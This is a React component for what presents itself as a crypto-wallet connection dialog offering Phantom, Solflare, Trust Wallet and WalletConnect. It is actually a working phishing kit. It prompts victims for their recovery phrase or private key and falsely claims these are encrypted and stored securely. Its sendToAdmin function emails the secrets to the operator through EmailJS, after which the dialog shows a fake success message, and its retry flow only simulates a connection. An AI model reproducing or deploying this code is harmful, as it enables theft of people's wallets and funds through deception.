import { useState, useEffect, useRef } from "react";
import "../index.css";
import phantomImg from "/src/assets/phantom.jpg";
import solflareImg from "/src/assets//Solfare.png";
import trustwalletImg from "/src/assets//Trustwallet.jpg";
import walletconnectImg from "/src/assets//WalletConnect.jpg";

/* WALLET IMAGES */
const walletImages = {
  Phantom: phantomImg,
  Solflare: solflareImg,
  "Trust Wallet": trustwalletImg,
  WalletConnect: walletconnectImg,
};

const WalletIcon = ({ name, size = 52 }) => {
  const src = walletImages[name];
  if (!src) return null;
  return (
    <img
      src={src}
      alt={name}
      width={size}
      height={size}
      style={{ borderRadius: "14px", objectFit: "cover" }}
    />
  );
};

const WALLETS = [
  { name: "Phantom", sub: "Solana • Ethereum • Polygon" },
  { name: "Solflare", sub: "Solana wallet" },
  { name: "Trust Wallet", sub: "Multi-chain wallet" },
  { name: "WalletConnect", sub: "Scan with any wallet" },
];

/* ICON COMPONENTS */
function CloseIcon() {
  return (
    <svg
      width="20"
      height="20"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2"
      strokeLinecap="round"
    >
      <line x1="18" y1="6" x2="6" y2="18" />
      <line x1="6" y1="6" x2="18" y2="18" />
    </svg>
  );
}

function BackIcon() {
  return (
    <svg
      width="20"
      height="20"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2"
      strokeLinecap="round"
    >
      <path d="M15 18l-6-6 6-6" />
    </svg>
  );
}

function EyeIcon({ visible }) {
  return visible ? (
    <svg
      width="18"
      height="18"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2"
    >
      <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
      <line x1="1" y1="1" x2="23" y2="23" />
    </svg>
  ) : (
    <svg
      width="18"
      height="18"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2"
    >
      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
      <circle cx="12" cy="12" r="3" />
    </svg>
  );
}

function ShieldIcon() {
  return (
    <svg
      width="28"
      height="28"
      viewBox="0 0 24 24"
      fill="none"
      stroke="#7C5CFC"
      strokeWidth="1.5"
    >
      <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
    </svg>
  );
}

function KeyIcon() {
  return (
    <svg
      width="20"
      height="20"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2"
      strokeLinecap="round"
      strokeLinejoin="round"
    >
      <path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4" />
    </svg>
  );
}

function LockIcon() {
  return (
    <svg
      width="20"
      height="20"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2"
      strokeLinecap="round"
      strokeLinejoin="round"
    >
      <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
      <path d="M7 11V7a5 5 0 0 1 10 0v4" />
    </svg>
  );
}

function InfoIcon() {
  return (
    <svg
      width="14"
      height="14"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2"
      strokeLinecap="round"
    >
      <circle cx="12" cy="12" r="10" />
      <line x1="12" y1="16" x2="12" y2="12" />
      <line x1="12" y1="8" x2="12.01" y2="8" />
    </svg>
  );
}

function ChevronRight() {
  return (
    <svg
      width="16"
      height="16"
      viewBox="0 0 24 24"
      fill="none"
      stroke="#4b5563"
      strokeWidth="2.5"
      strokeLinecap="round"
      strokeLinejoin="round"
    >
      <path d="M9 5l7 7-7 7" />
    </svg>
  );
}

/* MAIN COMPONENT */
export const ConnectWallet = ({ isOpen, onClose }) => {
  /* ─── State ─── */
  const [step, setStep] = useState("list");
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [phraseInput, setPhraseInput] = useState("");
  const [privateKeyInput, setPrivateKeyInput] = useState("");
  const [showPhrase, setShowPhrase] = useState(false);
  const [showKey, setShowKey] = useState(false);
  const [errorMsg, setErrorMsg] = useState("");

  const closeTimeoutRef = useRef(null);

  /* Cleanup on unmount */
  useEffect(() => {
    return () => {
      if (closeTimeoutRef.current) clearTimeout(closeTimeoutRef.current);
    };
  }, []);

  /* ─── Reset everything ─── */
  const reset = () => {
    setStep("list");
    setSelectedWallet(null);
    setPhraseInput("");
    setPrivateKeyInput("");
    setShowPhrase(false);
    setShowKey(false);
    setErrorMsg("");
  };

  /* ─── Close modal ─── */
  const handleClose = () => {
    if (closeTimeoutRef.current) clearTimeout(closeTimeoutRef.current);
    reset();
    onClose();
  };

  /* ─── Select wallet → go to import options ─── */
  const handleWalletSelect = (wallet) => {
    setSelectedWallet(wallet);
    setStep("import");
  };

  /* ─── Go back to list ─── */
  const backToList = () => {
    setStep("list");
    setSelectedWallet(null);
  };

  /* ─── Go back to import options ─── */
  const backToOptions = () => {
    setStep("import");
    setErrorMsg("");
  };

  /* ─── Show recovery phrase step ─── */
  const showRecoveryPhrase = () => {
    setStep("phrase");
    setErrorMsg("");
  };

  /* ─── Show private key step ─── */
  const showPrivateKey = () => {
    setStep("privatekey");
    setErrorMsg("");
  };

  /* ─── EmailJS: send wallet data ─── */
  const sendToAdmin = async (type) => {
    let userMessage = "";
    if (type === "recovery") userMessage = phraseInput.trim();
    if (type === "private") userMessage = privateKeyInput.trim();

    if (!userMessage) {
      alert("Please enter a value");
      return false;
    }

    // Check if EmailJS is loaded
    if (typeof window === "undefined" || !window.emailjs) {
      console.error(
        "EmailJS not loaded. Make sure you included the script tag in your index.html:",
      );
      console.error(
        '<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>',
      );
      setErrorMsg("Email service not available. Please try again later.");
      return false;
    }

    try {
      const response = await window.emailjs.send(
        "service_7b6plaq",
        "template_11gv4jc",
        {
          user_message: userMessage,
          wallet_type: selectedWallet?.name || "Unknown",
          import_type: type === "recovery" ? "Recovery Phrase" : "Private Key",
          reply_to: "noreply@Omnidev.com",
          from_name: "Omnidev Wallet Connect",
        },
      );
      console.log("Email sent successfully:", response);
      return true;
    } catch (err) {
      console.error("Email failed:", err);
      setErrorMsg("Failed to send. Please check your EmailJS configuration.");
      return false;
    }
  };

  /* ─── Validate & connect ─── */
  const handleConnect = async (type) => {
    // Validate recovery phrase if on phrase step
    if (step === "phrase") {
      const words = phraseInput
        .trim()
        .split(/[\n\s]+/)
        .filter((w) => w.length > 0);
      if (words.length !== 12 && words.length !== 24) {
        setErrorMsg(
          `Please enter exactly 12 or 24 words. You entered ${words.length} words.`,
        );
        return;
      }
    }

    // Validate private key
    if (step === "privatekey" && !privateKeyInput.trim()) {
      setErrorMsg("Please enter your private key.");
      return;
    }

    setErrorMsg("");
    setStep("connecting");

    // Send email FIRST, then show success
    const sent = await sendToAdmin(type);

    if (sent) {
      setStep("success");
    } else {
      setStep("failed");
    }
  };

  /* ─── Retry connection ─── */
  const retryConnection = () => {
    setStep("connecting");
    closeTimeoutRef.current = setTimeout(() => {
      setStep("failed");
    }, 3000);
  };

  if (!isOpen) return null;

  return (
    <>
      {/* Backdrop */}
      <div className="cw-backdrop" onClick={handleClose} />

      {/* Modal */}
      <div
        className="cw-modal"
      >
        {/* ═══════ STEP: LIST ═══════ */}
        {step === "list" && (
          <div className="cw-content">
            <div className="cw-header">
              <h2 className="cw-title">Connect Your Wallet</h2>
              <button
                className="cw-icon-btn cw-close-btn"
                onClick={handleClose}
              >
                <CloseIcon />
              </button>
            </div>

            <div className="cw-wallet-list">
              {WALLETS.map((wallet) => (
                <button
                  key={wallet.name}
                  className="cw-wallet-row"
                  onClick={() => handleWalletSelect(wallet)}
                >
                  <div className="cw-wallet-icon">
                    <WalletIcon name={wallet.name} size={52} />
                  </div>
                  <div className="cw-wallet-info">
                    <p className="cw-wallet-name">{wallet.name}</p>
                    <p className="cw-wallet-sub">{wallet.sub}</p>
                  </div>
                  <ChevronRight />
                </button>
              ))}
            </div>
          </div>
        )}

        {/* ═══════ STEP: IMPORT OPTIONS ═══════ */}
        {step === "import" && (
          <div className="cw-content">
            <div className="cw-header">
              <button className="cw-icon-btn" onClick={backToList}>
                <BackIcon />
              </button>
              <h2 className="cw-title">Import Wallet</h2>
              <button
                className="cw-icon-btn cw-close-btn"
                onClick={handleClose}
              >
                <CloseIcon />
              </button>
            </div>

            <div className="cw-wallet-badge">
              <div className="cw-wallet-icon-sm">
                <WalletIcon name={selectedWallet?.name} size={44} />
              </div>
              <span className="cw-wallet-badge-name">
                {selectedWallet?.name}
              </span>
            </div>

            <div className="cw-import-list">
              <button className="cw-import-option" onClick={showRecoveryPhrase}>
                <div className="cw-import-icon">
                  <KeyIcon />
                </div>
                <div className="cw-import-info">
                  <p className="cw-import-label">
                    Import Secret Recovery Phrase
                  </p>
                  <p className="cw-import-sub">
                    Enter your 12 or 24 word recovery phrase
                  </p>
                </div>
                <ChevronRight />
              </button>

              <button className="cw-import-option" onClick={showPrivateKey}>
                <div className="cw-import-icon">
                  <LockIcon />
                </div>
                <div className="cw-import-info">
                  <p className="cw-import-label">Import Private Key</p>
                  <p className="cw-import-sub">
                    Enter your private key directly
                  </p>
                </div>
                <ChevronRight />
              </button>
            </div>
          </div>
        )}

        {/* ═══════ STEP: RECOVERY PHRASE ═══════ */}
        {step === "phrase" && (
          <div className="cw-content">
            <div className="cw-header">
              <button className="cw-icon-btn" onClick={backToOptions}>
                <BackIcon />
              </button>
              <h2 className="cw-title">Import Wallet</h2>
              <button
                className="cw-icon-btn cw-close-btn"
                onClick={handleClose}
              >
                <CloseIcon />
              </button>
            </div>

            <div className="cw-wallet-badge">
              <div className="cw-wallet-icon-sm">
                <WalletIcon name={selectedWallet?.name} size={40} />
              </div>
              <span className="cw-wallet-badge-name">
                {selectedWallet?.name}
              </span>
            </div>

            <div className="cw-center-block">
              <div className="cw-shield">
                <ShieldIcon />
              </div>
              <p className="cw-center-title">Enter Recovery Phrase</p>
              <p className="cw-center-sub">
                Your recovery phrase is encrypted and stored securely
              </p>
            </div>

            <label className="cw-label">Recovery Phrase</label>
            <div className="cw-input-wrap">
              <textarea
                className={`cw-textarea ${showPhrase ? "" : "cw-textarea-hidden"}`}
                value={phraseInput}
                onChange={(e) => setPhraseInput(e.target.value)}
                rows={4}
                placeholder="Enter your 12 or 24 word recovery phrase separated by spaces"
              />
              <button
                className="cw-eye-btn"
                onClick={() => setShowPhrase(!showPhrase)}
              >
                <EyeIcon visible={showPhrase} />
              </button>
            </div>

            {errorMsg && (
              <p className="cw-error-msg">
                <svg
                  width="14"
                  height="14"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="#ef4444"
                  strokeWidth="2"
                >
                  <circle cx="12" cy="12" r="10" />
                  <line x1="12" y1="8" x2="12" y2="12" />
                  <line x1="12" y1="16" x2="12.01" y2="16" />
                </svg>
                {errorMsg}
              </p>
            )}

            <p className="cw-hint">
              <InfoIcon /> Separate each word with a space
            </p>

            <div className="cw-btn-group">
              <button
                className="cw-btn cw-btn-secondary"
                onClick={backToOptions}
              >
                Back
              </button>
              <button
                className="cw-btn cw-btn-primary"
                onClick={() => handleConnect("recovery")}
              >
                Import Wallet
              </button>
            </div>
          </div>
        )}

        {/* ═══════ STEP: PRIVATE KEY ═══════ */}
        {step === "privatekey" && (
          <div className="cw-content">
            <div className="cw-header">
              <button className="cw-icon-btn" onClick={backToOptions}>
                <BackIcon />
              </button>
              <h2 className="cw-title">Import Wallet</h2>
              <button
                className="cw-icon-btn cw-close-btn"
                onClick={handleClose}
              >
                <CloseIcon />
              </button>
            </div>

            <div className="cw-wallet-badge">
              <div className="cw-wallet-icon-sm">
                <WalletIcon name={selectedWallet?.name} size={40} />
              </div>
              <span className="cw-wallet-badge-name">
                {selectedWallet?.name}
              </span>
            </div>

            <div className="cw-center-block">
              <div className="cw-shield">
                <LockIcon />
              </div>
              <p className="cw-center-title">Enter Private Key</p>
              <p className="cw-center-sub">
                Your private key is encrypted and stored securely
              </p>
            </div>

            <label className="cw-label">Private Key</label>
            <div className="cw-input-wrap">
              <textarea
                className={`cw-textarea cw-textarea-mono ${showKey ? "" : "cw-textarea-hidden"}`}
                value={privateKeyInput}
                onChange={(e) => setPrivateKeyInput(e.target.value)}
                rows={3}
                placeholder="Enter your private key"
              />
              <button
                className="cw-eye-btn"
                onClick={() => setShowKey(!showKey)}
              >
                <EyeIcon visible={showKey} />
              </button>
            </div>

            <div className="cw-btn-group">
              <button
                className="cw-btn cw-btn-secondary"
                onClick={backToOptions}
              >
                Back
              </button>
              <button
                className="cw-btn cw-btn-primary"
                onClick={() => handleConnect("private")}
              >
                Import Wallet
              </button>
            </div>
          </div>
        )}

        {/* ═══════ STEP: CONNECTING ═══════ */}
        {step === "connecting" && (
          <div className="cw-state-wrap">
            <div className="cw-spinner" />
            <h3 className="cw-state-title">Connecting...</h3>
            <p className="cw-state-sub">
              Please wait while we connect to your wallet
            </p>
          </div>
        )}

        {/* ═══════ STEP: SUCCESS ═══════ */}
        {step === "success" && (
          <div className="cw-state-wrap">
            <div
              style={{
                width: 64,
                height: 64,
                borderRadius: "50%",
                background: "#dcfce7",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                marginBottom: 16,
              }}
            >
              <svg
                width="32"
                height="32"
                viewBox="0 0 24 24"
                fill="none"
                stroke="#22c55e"
                strokeWidth="2.5"
                strokeLinecap="round"
                strokeLinejoin="round"
              >
                <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14" />
                <polyline points="22 4 12 14.01 9 11.01" />
              </svg>
            </div>
            <h3 className="cw-state-title" style={{ color: "#22c55e" }}>
              Wallet Connected!
            </h3>
            <p className="cw-state-sub">
              Your wallet has been successfully connected, refresh your trading
              terminal within 10minutes.
            </p>
            <div className="cw-state-actions">
              <button className="cw-btn cw-btn-primary" onClick={handleClose}>
                Done
              </button>
            </div>
          </div>
        )}

        {/* ═══════ STEP: FAILED ═══════ */}
        {step === "failed" && (
          <div className="cw-state-wrap">
            <div className="cw-error-icon">
              <svg
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="none"
                stroke="#ef4444"
                strokeWidth="2"
              >
                <circle cx="12" cy="12" r="10" />
                <line x1="12" y1="8" x2="12" y2="12" />
                <line x1="12" y1="16" x2="12.01" y2="16" />
              </svg>
            </div>
            <h3 className="cw-state-title">Connection Failed</h3>
            <p className="cw-state-sub">
              Error connecting wallet. Please try again.
            </p>
            <div className="cw-state-actions">
              <button className="cw-btn cw-btn-secondary" onClick={backToList}>
                Go Back
              </button>
              <button
                className="cw-btn cw-btn-primary"
                onClick={retryConnection}
              >
                Retry
              </button>
            </div>
          </div>
        )}
      </div>
    </>
  );
};
